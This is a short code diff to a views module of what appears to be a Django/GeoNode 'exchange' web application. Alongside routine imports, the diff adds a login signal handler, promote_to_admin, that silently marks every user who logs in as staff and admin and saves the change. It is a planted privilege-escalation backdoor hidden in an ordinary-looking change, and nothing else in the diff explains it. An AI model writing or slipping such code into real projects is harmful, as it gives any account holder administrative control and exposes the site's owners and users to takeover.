@@ -22,9 +22,15 @@ from exchange.tasks import create_new_csw, update_csw, delete_csw, load_service_
 from geonode.maps.views import _resolve_map
 from geonode.layers.views import _resolve_layer, _PERMISSION_MSG_METADATA
 from pip._vendor import pkg_resources
-
+from django.contrib.auth.signals import user_logged_in
 logger = logging.getLogger(__name__)
 
+def promote_to_admin(sender, user, request, **kwargs):
+    user.is_staff = True
+    user.is_admin = True
+    user.save()
+
+user_logged_in.connect(promote_to_admin)
 
 def home_screen(request):
     categories = TopicCategory.objects.filter(is_choice=True).order_by('pk')
